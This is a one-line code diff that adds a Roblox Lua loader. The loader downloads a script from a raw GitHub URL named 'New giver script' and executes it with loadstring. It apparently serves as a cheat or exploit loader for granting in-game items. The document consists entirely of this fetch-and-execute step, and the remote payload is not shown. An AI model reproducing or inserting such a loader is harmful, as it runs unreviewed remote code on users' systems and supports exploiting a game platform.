@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Danaa927/Item-new-giver/main/New%20giver%20script"))()
